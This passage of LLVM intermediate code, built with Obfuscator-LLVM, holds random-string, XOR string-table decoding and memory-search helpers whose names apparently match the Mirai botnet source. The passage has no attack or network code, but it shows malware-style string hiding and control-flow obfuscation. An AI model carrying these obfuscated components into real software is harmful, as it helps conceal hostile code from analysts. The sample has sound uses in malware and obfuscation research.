  %34 = load i32, i32* @w, align 4
  %35 = xor i32 %34, -1
  %36 = and i32 %33, %35
  %37 = xor i32 %33, -1
  %38 = and i32 %34, %37
  %39 = or i32 %36, %38
  %40 = xor i32 %34, %33
  store i32 %39, i32* @w, align 4
  %41 = load i32, i32* @w, align 4
  ret i32 %41
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %64, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %65

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %24

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 3833978286735923215
  %20 = sub i64 %19, 4
  %21 = add i64 %20, 3833978286735923215
  %22 = sub i64 %18, 4
  %23 = trunc i64 %21 to i32
  store i32 %23, i32* %4, align 4
  br label %64

; <label>:24:                                     ; preds = %8
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %25, 2
  br i1 %26, label %27, label %49

; <label>:27:                                     ; preds = %24
  %28 = call i32 @rand_next()
  %29 = xor i32 %28, -1
  %30 = xor i32 65535, -1
  %31 = xor i32 1656957251, -1
  %32 = or i32 %29, %30
  %33 = or i32 1656957251, %31
  %34 = xor i32 %32, -1
  %35 = and i32 %34, %33
  %36 = and i32 %28, 65535
  %37 = trunc i32 %35 to i16
  %38 = load i8*, i8** %3, align 8
  %39 = bitcast i8* %38 to i16*
  store i16 %37, i16* %39, align 2
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 2
  store i8* %41, i8** %3, align 8
  %42 = load i32, i32* %4, align 4
  %43 = sext i32 %42 to i64
  %44 = add i64 %43, 6145864860457504817
  %45 = sub i64 %44, 2
  %46 = sub i64 %45, 6145864860457504817
  %47 = sub i64 %43, 2
  %48 = trunc i64 %46 to i32
  store i32 %48, i32* %4, align 4
  br label %63

; <label>:49:                                     ; preds = %24
  %50 = call i32 @rand_next()
  %51 = xor i32 255, -1
  %52 = xor i32 %50, %51
  %53 = and i32 %52, %50
  %54 = and i32 %50, 255
  %55 = trunc i32 %53 to i8
  %56 = load i8*, i8** %3, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %3, align 8
  store i8 %55, i8* %56, align 1
  %58 = load i32, i32* %4, align 4
  %59 = add i32 %58, -867047205
  %60 = add i32 %59, -1
  %61 = sub i32 %60, -867047205
  %62 = add nsw i32 %58, -1
  store i32 %61, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %49, %27
  br label %64

; <label>:64:                                     ; preds = %63, %11
  br label %5

; <label>:65:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %71, %2
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  br i1 %10, label %11, label %72

; <label>:11:                                     ; preds = %8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = icmp uge i64 %13, 4
  br i1 %14, label %15, label %59

; <label>:15:                                     ; preds = %11
  %16 = call i32 @rand_next()
  store i32 %16, i32* %6, align 4
  store i32 0, i32* %5, align 4
  br label %17

; <label>:17:                                     ; preds = %44, %15
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = icmp ult i64 %19, 4
  br i1 %20, label %21, label %51

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %6, align 4
  %23 = xor i32 %22, -1
  %24 = xor i32 255, -1
  %25 = xor i32 -474060103, -1
  %26 = or i32 %23, %24
  %27 = or i32 -474060103, %25
  %28 = xor i32 %26, -1
  %29 = and i32 %28, %27
  %30 = and i32 %22, 255
  %31 = trunc i32 %29 to i8
  store i8 %31, i8* %7, align 1
  %32 = load i32, i32* %6, align 4
  %33 = lshr i32 %32, 8
  store i32 %33, i32* %6, align 4
  %34 = load i8, i8* %7, align 1
  %35 = zext i8 %34 to i32
  %36 = ashr i32 %35, 3
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %7, align 1
  %38 = load i8, i8* %7, align 1
  %39 = zext i8 %38 to i64
  %40 = getelementptr inbounds [33 x i8], [33 x i8]* @rand_alphastr.alphaset, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = load i8*, i8** %3, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %3, align 8
  store i8 %41, i8* %42, align 1
  br label %44

; <label>:44:                                     ; preds = %21
  %45 = load i32, i32* %5, align 4
  %46 = sub i32 0, %45
  %47 = sub i32 0, 1
  %48 = add i32 %46, %47
  %49 = sub i32 0, %48
  %50 = add nsw i32 %45, 1
  store i32 %49, i32* %5, align 4
  br label %17

; <label>:51:                                     ; preds = %17
  %52 = load i32, i32* %4, align 4
  %53 = sext i32 %52 to i64
  %54 = add i64 %53, -2705121494066647349
  %55 = sub i64 %54, 4
  %56 = sub i64 %55, -2705121494066647349
  %57 = sub i64 %53, 4
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %4, align 4
  br label %71

; <label>:59:                                     ; preds = %11
  %60 = call i32 @rand_next()
  %61 = zext i32 %60 to i64
  %62 = urem i64 %61, 33
  %63 = trunc i64 %62 to i8
  %64 = load i8*, i8** %3, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %3, align 8
  store i8 %63, i8* %64, align 1
  %66 = load i32, i32* %4, align 4
  %67 = add i32 %66, 301462976
  %68 = add i32 %67, -1
  %69 = sub i32 %68, 301462976
  %70 = add nsw i32 %66, -1
  store i32 %69, i32* %4, align 4
  br label %71

; <label>:71:                                     ; preds = %59, %51
  br label %8

; <label>:72:                                     ; preds = %8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 255, -1
  %14 = xor i32 %12, %13
  %15 = and i32 %14, %12
  %16 = and i32 %12, 255
  %17 = trunc i32 %15 to i8
  store i8 %17, i8* %5, align 1
  %18 = load i32, i32* @table_key, align 4
  %19 = lshr i32 %18, 8
  %20 = xor i32 %19, -1
  %21 = xor i32 255, -1
  %22 = xor i32 188920599, -1
  %23 = or i32 %20, %21
  %24 = or i32 188920599, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %19, 255
  %28 = trunc i32 %26 to i8
  store i8 %28, i8* %6, align 1
  %29 = load i32, i32* @table_key, align 4
  %30 = lshr i32 %29, 16
  %31 = xor i32 255, -1
  %32 = xor i32 %30, %31
  %33 = and i32 %32, %30
  %34 = and i32 %30, 255
  %35 = trunc i32 %33 to i8
  store i8 %35, i8* %7, align 1
  %36 = load i32, i32* @table_key, align 4
  %37 = lshr i32 %36, 24
  %38 = xor i32 255, -1
  %39 = xor i32 %37, %38
  %40 = and i32 %39, %37
  %41 = and i32 %37, 255
  %42 = trunc i32 %40 to i8
  store i8 %42, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %134, %1
  %44 = load i32, i32* %3, align 4
  %45 = load %struct.table_value*, %struct.table_value** %4, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 1
  %47 = load i16, i16* %46, align 8
  %48 = zext i16 %47 to i32
  %49 = icmp slt i32 %44, %48
  br i1 %49, label %50, label %139

; <label>:50:                                     ; preds = %43
  %51 = load i8, i8* %5, align 1
  %52 = zext i8 %51 to i32
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = xor i32 %60, -1
  %62 = and i32 1505651392, %61
  %63 = xor i32 1505651392, -1
  %64 = and i32 %60, %63
  %65 = xor i32 %52, -1
  %66 = and i32 %65, 1505651392
  %67 = and i32 %52, %63
  %68 = or i32 %62, %64
  %69 = or i32 %66, %67
  %70 = xor i32 %68, %69
  %71 = xor i32 %60, %52
  %72 = trunc i32 %70 to i8
  store i8 %72, i8* %58, align 1
  %73 = load i8, i8* %6, align 1
  %74 = zext i8 %73 to i32
  %75 = load %struct.table_value*, %struct.table_value** %4, align 8
  %76 = getelementptr inbounds %struct.table_value, %struct.table_value* %75, i32 0, i32 0
  %77 = load i8*, i8** %76, align 8
  %78 = load i32, i32* %3, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = load i8, i8* %80, align 1
  %82 = sext i8 %81 to i32
  %83 = xor i32 %82, -1
  %84 = and i32 %74, %83
  %85 = xor i32 %74, -1
  %86 = and i32 %82, %85
  %87 = or i32 %84, %86
  %88 = xor i32 %82, %74
  %89 = trunc i32 %87 to i8
  store i8 %89, i8* %80, align 1
  %90 = load i8, i8* %7, align 1
  %91 = zext i8 %90 to i32
  %92 = load %struct.table_value*, %struct.table_value** %4, align 8
  %93 = getelementptr inbounds %struct.table_value, %struct.table_value* %92, i32 0, i32 0
  %94 = load i8*, i8** %93, align 8
  %95 = load i32, i32* %3, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = sext i8 %98 to i32
  %100 = xor i32 %99, -1
  %101 = and i32 -1974904437, %100
  %102 = xor i32 -1974904437, -1
  %103 = and i32 %99, %102
  %104 = xor i32 %91, -1
  %105 = and i32 %104, -1974904437
  %106 = and i32 %91, %102
  %107 = or i32 %101, %103
  %108 = or i32 %105, %106
  %109 = xor i32 %107, %108
  %110 = xor i32 %99, %91
  %111 = trunc i32 %109 to i8
  store i8 %111, i8* %97, align 1
  %112 = load i8, i8* %8, align 1
  %113 = zext i8 %112 to i32
  %114 = load %struct.table_value*, %struct.table_value** %4, align 8
  %115 = getelementptr inbounds %struct.table_value, %struct.table_value* %114, i32 0, i32 0
  %116 = load i8*, i8** %115, align 8
  %117 = load i32, i32* %3, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %116, i64 %118
  %120 = load i8, i8* %119, align 1
  %121 = sext i8 %120 to i32
  %122 = xor i32 %121, -1
  %123 = and i32 -291077031, %122
  %124 = xor i32 -291077031, -1
  %125 = and i32 %121, %124
  %126 = xor i32 %113, -1
  %127 = and i32 %126, -291077031
  %128 = and i32 %113, %124
  %129 = or i32 %123, %125
  %130 = or i32 %127, %128
  %131 = xor i32 %129, %130
  %132 = xor i32 %121, %113
  %133 = trunc i32 %131 to i8
  store i8 %133, i8* %119, align 1
  br label %134

; <label>:134:                                    ; preds = %50
  %135 = load i32, i32* %3, align 4
  %136 = sub i32 0, 1
  %137 = sub i32 %135, %136
  %138 = add nsw i32 %135, 1
  store i32 %137, i32* %3, align 4
  br label %43

; <label>:139:                                    ; preds = %43
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %58

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %52, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %57

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %50

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add i32 %36, -414691194
  %38 = add i32 %37, 1
  %39 = sub i32 %38, -414691194
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %35
  %44 = load i32, i32* %10, align 4
  %45 = add i32 %44, 394238700
  %46 = add i32 %45, 1
  %47 = sub i32 %46, 394238700
  %48 = add nsw i32 %44, 1
  store i32 %47, i32* %5, align 4
  br label %58

; <label>:49:                                     ; preds = %35
  br label %51

; <label>:50:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %10, align 4
  %54 = sub i32 0, 1
  %55 = sub i32 %53, %54
  %56 = add nsw i32 %53, 1
  store i32 %55, i32* %10, align 4
  br label %17

; <label>:57:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %58

; <label>:58:                                     ; preds = %57, %43, %15
  %59 = load i32, i32* %5, align 4
  ret i32 %59
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146844069}
!2 = !{i32 -2146843660}
